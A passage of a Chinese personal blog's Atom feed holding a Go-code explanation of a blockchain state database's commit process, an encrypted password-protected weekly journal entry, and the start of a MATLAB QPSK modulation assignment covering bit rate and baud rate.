class="comment">//标记被修改过的账户</span></span><br><span class="line">    dbErr  error</span><br><span class="line">lock sync.Mutex</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先，</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">db: = state.NewDatabase(levelDB)</span><br><span class="line">statedb, err := state.New(block.Root(), db)</span><br></pre></td></tr></table></figure><p>这里的 New 函数为：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//state/statedb.go:27</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">New</span><span class="params">(root hash.Hash, db Database)</span> <span class="params">(*StateDB, error)</span></span> &#123;</span><br><span class="line">tr, err := db.OpenTrie(root)<span class="comment">//打开指定状态版本(root)的含世界状态的顶层树</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> &amp;StateDB&#123;</span><br><span class="line">db:                db,<span class="comment">//②</span></span><br><span class="line">trie:              tr,</span><br><span class="line">stateObjects:      <span class="built_in">make</span>(<span class="keyword">map</span>[account.Address]*stateObject),</span><br><span class="line">        stateObjectsDirty: <span class="built_in">make</span>(<span class="keyword">map</span>[account.Address]<span class="keyword">struct</span>&#123;&#125;),</span><br><span class="line">preimages:         <span class="built_in">make</span>(<span class="keyword">map</span>[hash.Hash][]<span class="keyword">byte</span>),</span><br><span class="line">journal:           newJournal(),</span><br><span class="line">&#125;, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>世界态中的所有状态都是已账户为基础单位存在的，因此为了便于账户隔离管理，使用不开放的 stateObject 来维护某个账户下的状态。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> StateObject <span class="keyword">struct</span> &#123;</span><br><span class="line"><span class="comment">//账户哈希</span></span><br><span class="line">addrHash <span class="keyword">string</span></span><br><span class="line">data     User <span class="comment">//账户属性</span></span><br><span class="line"><span class="comment">//底层数据库</span></span><br><span class="line">db *state.StateDB</span><br><span class="line"><span class="comment">// 写缓存</span></span><br><span class="line">trie Trie <span class="comment">// 存储树，第一次访问时初始化</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> &#123;</span><br><span class="line"><span class="comment">//账户地址</span></span><br><span class="line">Address []<span class="keyword">byte</span></span><br><span class="line"><span class="comment">//账户余额</span></span><br><span class="line">Amount <span class="keyword">float64</span></span><br><span class="line"><span class="comment">//交易个数</span></span><br><span class="line">Nonce <span class="keyword">uint64</span></span><br><span class="line"><span class="comment">//storage树根哈希值</span></span><br><span class="line">Root <span class="keyword">string</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到 stateObject 中维护关于某个账户的所有信息，涉及账户地址、账户地址哈希、底层数据库、存储树等内容。<br>在区块中，将交易作为输入条件，来根据一系列动作修改状态。 在完成区块挖矿前，只是获得在内存中的状态树的 Root 值。 StateDB 可视为一个内存数据库，状态数据先在内存数据库中完成修改，所有关于状态的计算都在内存中完成。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//将每个交易对应的的账户状态树进行修改</span></span><br><span class="line">usr := getUserByAddress(t.Address)</span><br><span class="line"><span class="keyword">if</span> usr.Amount - t.Fee &lt;<span class="number">0</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line">usr.Nonce = usr.Nonce + <span class="number">1</span></span><br><span class="line">uMPT := getMPT(usr.Root)</span><br><span class="line">data := *(*[]<span class="keyword">byte</span>)(unsafe.Pointer(&amp;t))</span><br><span class="line">uMPT.Put([]<span class="keyword">byte</span>(t.Hash),data)</span><br><span class="line">usr.Root := uMPT.RootHash()</span><br></pre></td></tr></table></figure><p>在将区块持久化时完成有内存到数据库的更新存储，此更新属于增量更新，仅仅修改涉及到被修改部分。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// state/statedb.go:122</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *StateDB)</span> <span class="title">Commit</span><span class="params">(deleteEmptyObjects <span class="keyword">bool</span>)</span> <span class="params">(root hash.Hash, err error)</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> addr := <span class="keyword">range</span> s.journal.dirties &#123;<span class="comment">//①⑧⑨⑩</span></span><br><span class="line">s.stateObjectsDirty[addr] = <span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> addr, stateObject := <span class="keyword">range</span> s.stateObjects &#123;<span class="comment">//②</span></span><br><span class="line">_, isDirty := s.stateObjectsDirty[addr]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> isDirty&#123;</span><br><span class="line"><span class="comment">//如果集合中的账户有变更</span></span><br><span class="line"><span class="keyword">if</span> err := stateObject.CommitTrie(s.db); err != <span class="literal">nil</span> &#123;<span class="comment">//⑤</span></span><br><span class="line"><span class="keyword">return</span> common.Hash&#123;&#125;, err</span><br><span class="line">&#125;</span><br><span class="line">s.updateStateObject(stateObject)<span class="comment">//需要提交此账户</span></span><br><span class="line">  &#125;</span><br><span class="line"><span class="built_in">delete</span>(s.stateObjectsDirty, addr)</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">root, err = s.trie.Commit(<span class="function"><span class="keyword">func</span><span class="params">(leaf []<span class="keyword">byte</span>, parent hash.Hash)</span> <span class="title">error</span></span> &#123;<span class="comment">//⑦</span></span><br><span class="line"><span class="keyword">var</span> account Account</span><br><span class="line"><span class="keyword">if</span> err := rlp.DecodeBytes(leaf, &amp;account); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> account.Root != emptyRoot &#123;</span><br><span class="line">s.db.TrieDB().Reference(account.Root, parent)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span> root, err</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>因为在修改某账户信息是，将会记录变更流水（journal），因此在提交保存修改时只需要将在流水中存在的记录作为修改集 ①。</li><li>所有访问过的账户信息，均被记录在 stateObjects 中，只需要遍历此集合 ② 便可以提交所有修改。</li><li>处理完每个需要提交的账户内容外，最后需要将账户树提交 ⑦。在提交过程中涉及账户内容作为叶子节点，在发送变动时，将更新账户节点和父节点的关系。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;h1 id=&quot;全局&quot;&gt;&lt;a href=&quot;#全局&quot; class=&quot;headerlink&quot; title=&quot;全局&quot;&gt;&lt;/a&gt;全局&lt;/h1&gt;&lt;p&gt;&lt;img src= &quot;/img/loading.gif&quot; data-lazy-src=&quot;https:/</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>生活周报-April-26-to-May-2</title>
    <link href="https://www.blog.hackerjerry.top/2021/05/01/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-April-26-to-May-2_new/"/>
    <id>https://www.blog.hackerjerry.top/2021/05/01/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-April-26-to-May-2_new/</id>
    <published>2021-05-01T09:59:24.000Z</published>
    <updated>2021-06-21T06:37:37.181Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="0e3e678ceddbdb6fe50f8326923f20e10a64eac2b1a71641530dc0b92ed34404">9de868b583bc49e754b3988b9080d7cff3617e4ea1f7484b7ff0f17d01b646576c7b1fa404195957a625f7cba00813ad0f5a3a245f9596dec846358c3ff153e134df321e20a5271e9e642351f6a4b3a7374e0b6065baf324118a410453fd2e9a59ab43d342b7729dba375b0f93faca53c81868b77858a98f5e864d6eebb06c17342f3b03b6821a3043638994f26f43df61eeec033d86c19075e726ae29d60f7f0043e7ea5f48f247978affd46a8d42a267b7d9207dd29d378a6e306b194e194654c92f0dddc9c245c1605a3dfdadbe914a3b763aebdd5e3dc2687687c9fcca9f16e7db904651cde8a65eb0b13074ce369bbe64a761e7a7019af1e6f2458f891f670cfc2659a673ddc63b9a08edbf8ee07b68a85357f76966b75c1dd9eb671054876736ca2bdd696aa00c6b9eff7da20bc3cc6b79aab2d35277d24aafc4188a81c4aec3689adb70b1d385447db4bd246d342767a24c61378a05e61c064d7b19d43e1c01954c8c782a4ae5fd81d0406a595faf7bfec808902e812888d6bc6a25b014615b98c42a3cd5b0b1e5438ff0d2bab5f3dd8aadd184c72ed07bd543ef614d2e107bbcd2d3bdf1585f4503a88d75e65f0f6726a8f52aff25f1216390a7f2f452d87950a05cadfb2d575e5d8d9f2eee2c857ae53aad51003600db64d375b3f287ebf45791e275e17ac8946ed861108c6ad256da9264544f15194d4dff3f824a71b6a3d88a7c6347f560d9cab7545b0fd969126f70e91ae00ed1a39c83f11aae0eb7ef78db77c70d1fd5ca95b90acd1d7b2cab308b8ae4626e399ca35fab714ebb593928a59a033d2c0e4ee178b7434b5a5e23f4a909998f96052ac5e02a6bc8981e3b1258c9984879ce25d32ddd3796b055673d3b7be17f80fe054c65a250bfe0b9b676e9d2a82d226d79853cc73d1516465a9857cc748e44eb51b46b2ae5442d9c57710c6ab11d238e72e8982c50e8f06bbe2dd753d028721b691f1e0536951e2262b6108b836f821fe31db3627efb4ea111cf70713b1dcab9908d86d3a24e16a52de6c3f5631c7cf4cd789966d6bc3758b1b56a0960d79226607626107a3080fb664441fa949efecdf95b248b7073072983cb64b319ca8cf57ccfebbf8f5d467c8546b84857b4a7c9dabfb57f3021436706dd7526e7ee202ae7930c2c782ce5194e991ee2046ff49d3d70423921e9794267596944ef240ecd775c0cadc732057152938220425d6e7bc8e5a28b5a264d46ecd6e4fc779f31696e687bdbf31cfb15849e7a5ccd9fa494370be2009da01eb5af1a0965eb613c04338698467f01de8e8de66e0a0b8b233ced4b38c85e909e32cb8808fe5b93770e47398aabdaaa7c25ca4c598d92144809bb9b95032aa479be8bb565e352b8a6d1d386899e7923cb71ea55a3110031f2739b46f3235b42df2a0dda6ba5974d93475c3a508228b60dbcabbc91736fa941d62d670dbef05a9a4ded06b8cbead672f90e269920a2ec5b056f10896cc001d0c99b31349a80d249d5cb56c4ece4ef3343e6f115e1163c5128353402cc87b1a47bb7bb618d3545715a2d6fdf476cf777913b3350c43ed510b2a3e2599c668f9cac5f6f1d2bf4076313b36cbc58a105e1358549e75981b6c6e6a3d129175827a6b0c504d1817ccb5fead7a7b8221a3c344fe8a44625e9ca0b62c6bf8559692fdfca02b0e3658c80805a2bba0dafb6d40d0dd5c87eea6e8fcbdf079cb3f1a8e05c67f3a9ef8e8aa0043ba40dd4124a13bf646c05e2972194cb3d2bdeb2793769c73a74da17f8f9e6f5c48aba0028413638fc9fa700e71d85c26bc2a2f72a8b065127eea415b0fabb468365cd03079f6ef24750539293520c0a10f2f74f4c72ab746845306a6b70936d08b81b55da0bcf851d67df64eeaed8e110fe04f2b90712cb48f7827f4c7f97275b8f52e4c27ebb0072d4a666bd350cc0c1a0545735a71618a71d3f40491cdf87caee73992ec3028979d4cb482aceabcc5e87a1dbe1b8542acccf08dc635402726cb5e6d108ef9e8870deecf5d36218ba58cde90fef4cadb2b7d1957abcc6cd47b6e42a1ac89e54570ab9cc37127bb08165961ddc4856ae887a04f1c0ee39a55a8d07af6d524d8b2c19c43f97b3a8164a36fe5caea264cc334ed2a96dae278d2b0a648fda1799afc4a04a4d6b09383b98a6a6752d0a2fc82dd6c608b5ab232dc563924c368111c832d2298db59f38b24d618f715f70d70f2386f97c096bfbb13d5ec802fe5a29679184fc06093fbf1cd561bea3b27d6ea0dcaabc80278aacadb4bde752925917462a24ea724f7d45ed0a9d964bb75f44d86a1fbe5c9f6a155219f68ac8595aedd5186353eb1ffbb475a5dbc282488047aa20a180eca270ae9a98262c0a3ce2fa402b7c0df777027d597c391e299bbf31f0759d570544bfe56af17aae2671eb71d153f8619f1fd6b7fe0600d6fa96e5c704d8730fee7d718737a6c12e741784d8519a2e2e7d89908c7bf9be755e930d15f9fa637b2a1d981262a4c4760fa00b10ad3f25fa5eab52e7951100fd745c672493020cf8309cb9deef770cd60fffad6313203aa332aa51069f1b19765a0a4bc2bd73ce76def3505debdb9f4375e42c1f3e13f32a22a3bdcbe8e846f0845fe3c761b5d922f4c4eb758cfcbbcec7e676cf7cba3cd73775005b6d7ce84832fd79ea0dd1b7c12e96bef6adafb9156ec7b6b6594d2b9b3e9be717332de814d2fe62e42065fe3cf2e80c777426b5d82327f3936a0a67235cfaeb01b67f4ec535286599ad8ce8b12e8bc7a6a9b4e539ffbcc255a3e9ec3e02431946db960fc1482473c8fadc76dfd3081d1fbd2af4f9dd9b8e3c7fc484e0e76145e1ede7a916671f812afdd53be67035fe41170e3c6007a1317d336b7e114e2d25ec355c087eb4e139af0a77213bdc8896dc056be69c5feab2dc1919def5197bd1e69bb1e46e6507c12fff3b1e18d767f9ec5a9b136d1565aba4f290a847e5004e9bf9b617fdc6f14e22dc84eccc4c8731b29feaa75823470778b070678da68ebcb02b555e16e7df22eae1131c5627c72dffdf9c15b7461cce8bf9d9f6715e69a2b297b3ef16b1240e77624613e1cc9d2d3b7586ea12a3381ba2cf72c1256a69f7b84258879a4544f3c5e71f7c909ec6e2cba3b1348436be33001076ba0b704416973fda637b2e2a1001582e2fbfbc059cf94539c760ef0031035e14a96e6976be1fa8898b707e14ae2cb5fa71c4101f654e65bbc02693451f5f91bdd17e8795292c07124d70764c2681cd1bc87cb6babdaf8e2d42e8891f14b5d5684d8e45b05fad6d133f93ce41339a2e90b6c31ee7ccd42306c79b30fdb424b2dce947963fc3d1ba72e425ab77502b46b97a1dad5b0b2fe3dafa66df995e64451bc77c6bfdc81ceca5702c65312dee9c68bccd38ed5f35e5273b5a3a3fa93cd61986dd18d2717e50015e50d5046052b018d50eb0898ad78b5df5e60cbb83fa314bd87ca60f79ccf3ab94ef5c35a4613267858273ac7f0424ad54398f5a1c6c12f489ad7aa0a6f5d353f6a0b291aa0a4b20b3b2a2e346ff3ccb79151f26e222d7520e0ac5365e7a10493a3c4c22d7a48230df0fee45004f91401e163181d2507acb9bb3f075093d96193cffce727ad026a2689998fa0c77a5a6dc6d2a10a7d007c325706dd6ef674003c83dc802c2033dd19c510f541acc7dd4e01385a377a2dd06769cbfc384297e260040dc82d904157ba0d569b42bb8c38145c065623ad30d9953615b71215a53190dbb93d1104faedaa5ffd338d8ba52c11ddabf217f1c28bf8135a8c00d9d2c00a9aa09f0c5be3692545c8d2c0fda30c503a94f633c56e989367ddabf8a4aedbda17e4676f40deb464e8cd1345cdaa4a17bb5f987470b7e4d1a9803a544e0ef8924cf2cdae6f8a8395116ad10c970500fac7e9d4f2327af47940a05b42dce9c6e0448e77b8902d893c797a363926176cefd8fd688f8428f2f7958079d7e234b16e824113317e5b8248db3fb9dead84fb915f5a196fb744c1628706f9073351caa8c36315a4a8e527f4905bfff636c6caecf2c02e35db50bac22404fe213a4c9b50d233347930fe7bd1df5b99827e478afdb0a67809934cd9b7129f868d1b3f6c5dab2f8ea66730c8b97deeeb11baef25ddf63de23fa051b76bf0aaf0470edbc9b2a815bd6bf339397646dffb9df8ab41a068001f829cfa440c3b5b163b948720dd599c69d33eff55ed28b3f4caf1404fd0dc01c29c90c6ba477634feb092bd76b8e70c98dbbc038c4997536003cf41afab766e2b31b27d0d91ff92d00d8792cf4892bedf5ac6e0ff6fdb8c2744ced3956b0fddccd8fdfc1d1773205d8f0fc79a9d5c58a5b2cb5ed5302ac70bb32af6f911edaa790bb7c646cf4c019ab5491a436c2357b8786ad9faf34b74ace2824d95f94163b8a375d7b367bbb4d645da8276b7ff174572886af0d84bb02c3810a286e9b0f90866c09ba3d02da75baa0c94d34f84f59b55fee8655e4f631087724507465d09e8536a2235a6f7ed5da6ac3aef45a3642d2ad3282ddb7bde8595884acdb03fdc7f7402afc0961c5f7c63d5487c89fdb33d669ddbd06009c0653411f514599f9431e4ae9f17eb4be283f7f64e0cbd98702533849bd2ff10cccae3b5ce918df52d6cf20dea8c02bdb701243f4ee963c7101e2d8e8fc22e9ccbcf107920b23e6ae1ab5d84bf6210c2c42ef4c9bfb71de1975c48a0a0e7c17806ba78b1cfff6270864aae369413931e3dc68831bc2bc044faeb0f8a7fd73f6578cdc418d4f11eaaad0223174711b42b125e1a0582788fe5bc38f2326596f3f21312b0031661794f9e7ca41d19337714310c162b4bf6de14d4d0222c0a2b6db2fac2d0e280e6d894d0f71a32e683e0b0d168b99673af1c54046c9187d6addce0c78d85745bc877f3c0fbb63cb2a7ab5077126ad3a16d2cd18db84e91070a87915743f155c483da0fbd1958dccdd27ba11b664386fb62dfaa934521c94f343f64c64373e887f29fa469d2de685e9205d44ea8983bc4088ce1d456d93111c77159722b89d6e2c5da08fa77ad0141725638e83a91a6da32cd4159976da69a4f88d50b12fa13de4d36fda27cbd4332488eac8bdd04d1cd81bb2afcb58043359d54f134a0a8922933ac6d199546a9d2c1d8b7bf60bdfe4872174965de57023f4e80ea181af106ebef2c3ab8c34612856a0467fddb762eaaae696000082d4f32082ec03754b39663ff8b5749fcd40e3072b2eddd1b2519e5c34e5cfbccd92420450f99ad599fedea9c4cd45e2231e7d3c8f31131680526345ca0222274462cf4e500262d833197cfaad4b82bc03249e7d7691ac04ffbd796a2bfe2b824a46fab54fc06b1daaaafe7ce1cd86600f95e6a54dc0cf23d7894c69e23eff34818938d24538e963ad03f69277b2b29aaad1dc5d428cf8fff90ebe3b0b8b50e9b262a3a87103cd003ec6d2da5daf960e5c69e78fcc02e98ad11ab643a3092d0be253ce2c6ac9a0ceee8d1a6153c929ffd5a097b75e0d7b0bae90d1b45e72279cddc58411a4d156656a7bcb03643fc1b2a9ed89773caf062f28da1885b560669e721b8601646bc6da8ce00c599325dac920f6385a386c899f30c89c482bdb8e409e667eece1047a5a64d73357945e408106f29dddbf6d1d4f063f75e9aad46d8420b9d1ad532a90dc6cf21ab5fa8040a5f461b35cd946c4b3886c8f57d4d9a8746aab901677c689817ece82ad60f395b8092d5e4d532bec15b23137e3ebce6baefbe9be13216df057e4df12d203facf355abacc5528f62b90833aa5dcf9bf556cb6208b497427e42fd0984a542f66ec3780e7d039414d1fa256c14649834f652a7a8454a66466f12cb2b71fe25b77b98e689e588c5e0d83f23cc1dccb85a55fb4f30335ec2ea5b7216e6b1a34be67d92bb84c1adc6e23da711d8a0bb275e5467f3179d80b596eeb7321d1cbec397144e5a52a07a4ad07dd55b63e51d2c9a900fdb15098c01e973acae09e1a397b9449da5d06ce9438297441d5aac6eb1e927fd89e93e948d2ed0a6ffeb611c23cbe1456d385e89b94b9f912f6be23b73f3d5b3655e43685424bee7dd9b287b98c436d3a3765ab38b827aa7013edb4389fd321cb65e69439bcefa54ab5178847d8af9c1fbc0e5be60c0664e2844ee71fd806bbdaa36fb77d4f79ec58d711beda2dc3a3be9f331be0acb3110babb2c0f734db85411549774221051676f40ce15161c9ca395f81ac2bc8d2ce1194b070416b85fe75f7f41338600f5c190ceba824c8038f0cccb0c14d7921a8c0b25d5e1f450825ce5399e1611eb06e4494967f482c3a71fd4f8ec49502a3e75a3fcf75b9206e41d2b2e93dec7defc5436736cf102c0d12c7043625f589584413ea29ce3a4d72e9fe695b0b3a1a6cced2ab3158223362b482e931cab55d9f61f88ae041403ef49dba693d97f5e15f3de8f77097696a075b9881d10510b2edd3972434933cac1964ab1c4b23f25a24c625b5935e0af9b505cc17bdd4a65bbb631b7e1ccd70375c765dd2db270584c9a70cb5bf3b05943a53d12d57bdd82c98e521367bc89d2e1cc44f5bb171650988884f20cf11e686e571338a1a418c9f5b2ad4b8ed764c5d868fdd5554313d48b5ac3c7e43ef5b5e1937f3b6f465af1323c8779a9ee58a4f3377ceebce5162de179e298fad69922e020a74afdebcdfaad6c43c9ebe420a2119da5ce979992745c05c9088e814fec15edc57f1bba853290961586d88e47fca04e4c1a9a1be90e118e64609e1ad1206c4aa811a4f0d6a4046eb60312eb9819bfe0327ec3d7e4bf3a45c09064b723552ca0de1308fb6009afb666eadb9eb67a24a8a2151fd2b5de827eef89bf7ddbb6892b1676147147fb23c81b2ca680a4b839ffad2e2d63eac0f5f973d1b0a3fcf24503db45c17cee1dccc29396e78f61f36ac29d0bea82022bc3e73cc4784ef5a72c8f14ce48d8764126f95bbb29cb03559a24214b9870f427d2c53566cb06b1988241a296a12e8bd5347e01814cdb0739d752c3a58e478e5f126e7dce9c37875ddfb66a6ed9a2ad1e3ee460ae01158001843cb33c8bb938abbbb396ff1d3e2dfd687b78982da24454596af6164f691d91f502dd4fb85e66fa54c7e5ac14740c1f83b491bc3d46f677782f48bc29922dc697328d61f106f44414898a9bf7eef65fe40691ea17cee7f72e76860fccebe41e9d4972cfa1f6d71abeac7e1cffd7f297f7244f2b9faa5577884b345dd4477e2874e7b669be0d462c068b37c6d2dee93b37dad3dbb23cfcb3e1860e184bc399e5d8c445c85be11268dd4fa6d15892e1499add07dcb44e259a10e4803ebbfdfcc57c1046391e42b8cc259e0cf291f6c55e8b2662ac80790de6e99220dbe7aec3787a6b98af05d093aa74ad9903528393a9c74b404fe8764968fd1a26309a2a632d6c30a8fd050105eb6fd4ce82b7c434c9ed1872c317d1134475ad97ec13e2001be1496830b58da42e4704b6602df15a1bff2eae99c2bda97f0430ecafc2965a21d9fd29f2b7f773bcae2debe618ce5604cae516f022c7e3ff330075df6affc9ddb9560ef6c407c7c901b0e82644097bd68852a07e12c1ee4c479b7c04739c074a91064773678aab79cf03525aa2074a6fba785f5201e875021ec81e8bd406ee692c01c686ac47db6f5330df924ecf1e6f5006af3fb381d4a42c50866c668e4132a9d20db86607fa3de5ea159e80982a11214ab5f494ef7230a12349cd9b9a2c30d008dd6cf6ca43b7d44f8b4c040da9951401b94717f684eeb5eeadb11090cebeafe59a1b29543dcecdce8de56b0b04f431161aa1732f39e935d584d5eda78134efb8d0579a87ed8b86c198cff0049840fde20942a579490cb0ce576f00c12c8f73510eb0b757b2176929a54b9dd18b223aa5bf58bbd45b9ce8078c551efc2ce8b3ba1d8f6bd247214ab3a550256f74b965b61f94d23d797bd19c6c429eac7da07e17c57ee2e14fef867907664b36121b1759d2cf3b6c699e5cdbf47f8d74c6415548a6453b9ba705caca0cdfd6c22d5b9720e1aa81296cafe206c7ed93d63bfa919da490258d7dd548302f816f39429e7198ef812ef62f4d3a98c808facff9a91d8befbe455254ec9fd1090fe87f768bc836f7592864c3596f3058b31582f5b5f1a992be5ae6af0532f7b6a58fcae2838d500cce3458f246c2f37db9070193910bee6d2287c51ce1db354e8c909f431099af8cec34b74347975b6a2664bb8deb9f6d9718481e5acbea9b91cec5fe671f40d45b17a9cc4190d2523284aaff3ff04f88d291547b74755a6886a587804cb3342f42b388f2a65b9da993fd4227b45eac1afbcb15a885e44e51f3d36cabd714dab2eddef9ffbb4ffbbdd03bc5fb4de193702a6e91bc34ee6c44a60229ffd0411b49ae97b02f771778ad4b07d10e4eacece8f11df8df80f8ebc1c64865d1cbea46b010aa69fd5c54fd9399034a12556f0b7e0a04a27575b35b0aa8977d5471bdc59c51ee97694f7b8b7c9e364a337f39f2315b95fa883f8ed51ccba2b6fc7c5537e2dc609c6188487bdbd137b185eb0b488d1b407780bd07baeaf20b86b682685604677f3005f0667edfd6a47cc574f4858eb3c2013a816e632829070d7678a92bf3048d5b58982e3a7ecc1023d374f125fccd81ac82347b0a682dc4ae8ae4585aff79957d7b1b118d4de3ebcf55d6cb70c967ab223cd749000754c73d8f20a894f7babd768550eba63967afd7d3dc6eefb2475ee74c9955aad0adfda7e60fee7c383539100125f504a2d9a9b1caf44232f758016d93cc156e82b7134aa20af39311e8c393aa8af030957b93c4b744d978e670009a958d9e9b536f29c6e41748ae3eb5af6409499536732a562f8debeeee558a73853d75237d197511a663a7c9c53a4f0b3770a84df6eded389a764dda6b5a5ac9cdca1a51c4ba7fc8bdf54413324867b0b924431900b097e8d09b4df1eaf9506f864c35296f5c6ea9edd87943d0b27fc675fd8b248017ebcee2e0bf11fc4b8a5b14be6a9db336dcac08dc202cc03fee44a312bbc064337f43856d2cf73726674bfed534c794632f3522f818f5af924b73284a4f160691d407193ae75db962c79a04e7fe62a1378469fce62ad727a0f8de75bc635b07707a4e3a047ea7c7fd3a5757a698e3b42bf8f9e911d26ef212b036eabdad3c3cff0fae6b032d0a5518ee9dbb25f5319c7dbf79427a86812368800f8d48ee6b947c9cca037444b0a822fca78f7db424dec3844e913aaaaedc8babc8e300f726de938ed2c67c0d8602a6e827345e1c0606442aa7ebbcc758e1248d2c59b6e7bcc2f712e42ef63392ad803c8f58366047bac73ba70cf90998dd39b9d636bc4a421b6efa548a28fe35736c8de11e73ad4e1f8ae15ab739db25ab116c5f849f9fb1c7fd35dca75cd5ab5a5a675fb27598a61b014c71637bdb4c8c0f31bf31e76bfdf41a59753703e23ad994995978efb2c4aed11c5f896df16b70e6e603fae8daa55c9533d216f33d6b2622e5c1a60150d2d8e9c4923efa30f2441ee9847735ae708ab615a366d0513532b3f40d4257015660c17320133a16bd724526f2d48223e9ab770f78e729005012b8d3d5e6518fb669a977eda9111e6db71c7da497be33d2891670c16037d20692d577c2aaba7eb4ac47acf1027fc797fb6663bd91dd4ed7aac131e145f1142529eecf95dd52fb6fd862de7cd05170eaa69ad7116304f2f99b66b9353dabe046ff815bab5d1f08cdb7f6c237101b380139366130dd5b15e97a8f8897baedfa6954db07a746c9d7864847b19152273d0583a6776228f4857199009dd8f690267e27fa3fe8659af48e9eaafdf4018d33b849523bb981b2f339e44e6672d253d61bc10a030b45e39f0e8468beb41da6bcc7721ea113e290a4cc3d331faf99250d624f09e5970a7282adca4639490918983a427e82bc65e7f3dbd3b1413a2b99eeda748bfa903609ef1d40ef6839f337fc784c56ae42b2408facc6923d6cd435c748d072bfd60729024227b5fd589dfbd3ddc61775c6bdd46ab6d0e44d7745f9ab45cc986dca0587ff45c83c3c2aff9abc6</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="周报" scheme="https://www.blog.hackerjerry.top/categories/%E5%91%A8%E6%8A%A5/"/>
    
    
    <category term="生活周报" scheme="https://www.blog.hackerjerry.top/tags/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>QPSK信号调制</title>
    <link href="https://www.blog.hackerjerry.top/2021/04/27/QPSK%E4%BF%A1%E5%8F%B7%E8%B0%83%E5%88%B6_new/"/>
    <id>https://www.blog.hackerjerry.top/2021/04/27/QPSK%E4%BF%A1%E5%8F%B7%E8%B0%83%E5%88%B6_new/</id>
    <published>2021-04-27T13:46:38.000Z</published>
    <updated>2021-06-21T06:40:46.683Z</updated>
    
    <content type="html"><![CDATA[<p>b 测题目，由于学长写的代码有些步骤无法理解，而且代码不优雅，故重写之。</p><a id="more"></a><h1 id="题目要求"><a href="#题目要求" class="headerlink" title="题目要求"></a>题目要求</h1><ol><li>源码信号为周期 63bits 的 m 序列， 源码比特速率（kbps） 数值上= 载波频率（kHz），数值范围 5—100，在数值范围内任取整数；</li><li>在 MATLAB 环境中编写 M 代码搭建 QPSK 调制系统模型；</li><li>观测基带时域波形、已调信号时域波形；</li><li>观测基带发射星座图；</li><li>观测已调信号的功率谱（优先）或频谱；</li></ol><h1 id="实验原理"><a href="#实验原理" class="headerlink" title="实验原理"></a>实验原理</h1><h2 id="比特率"><a href="#比特率" class="headerlink" title="比特率"></a>比特率</h2><p>比特率(bit rate)又称传信率、信息传输速率(简称信息速率，information rate)。其定义是：<strong>通信线路(或系统)单位时间(每秒)内传输的信息量，即每秒能传输的二进制位</strong>数，通常用 Rb 表示，其单位是比特/秒(bit/s 或 b/s，英文缩略语为 bps)。　　<br>在二进制系统中，信息速率(比特率)与信号速率(波特率)相等，例如，当系统以每秒 50 个二进制符号传输时，信息速率为 50bit/s，信号速率也为 50Bd(波特)。在无调制的情况下，比特率等于波特率；采用调相技术时，比特率不等于波特率。通信系统的发送设备和接收设备必须在相同的波特率下工作，否则会出现帧同步错误。</p><h2 id="波特率"><a href="#波特率" class="headerlink" title="波特率"></a>波特率</h2><p>波特率(Baud rate)又称传码率、码元传输速率(简称码元速率)、信号传输速率(简称信号速率，signaling rate)或调制速率。其定义是：<strong>通信线路(或系统)单位时间(每秒)内传输的码元(脉冲)个数</strong>；或者表示信号调制过程中，单位时间内调制信号波形的变换次数，通常用 RB 表示，单位是波特(Bd 或 Baud，前者规范)。如果每秒传输 1 个码元就称为 1Bd；如果 1 码元的时间长短为 200ms，则每秒可传输 5 个码元，那么码元速率(波特率)就是 5Bd。　　<br>波特率(码元速率)并没有限定是何种进制的码元，所以给出波特率时必须说明这个码元的进制。对于 M 进制码元，比特率(信息速率)Rb 与波特率(码元速率)RB 的关系式为　　<br>Rb=RB·lbM 　　<br>式中：lbM=log2M，表示 M 的以 2 为底的对数。显然，对于二进制码元，由于 lb2=1，所以 Rb=RB，即波特率与比特率在数值上相等，但单位不同，也即二者代表的意义不同。　　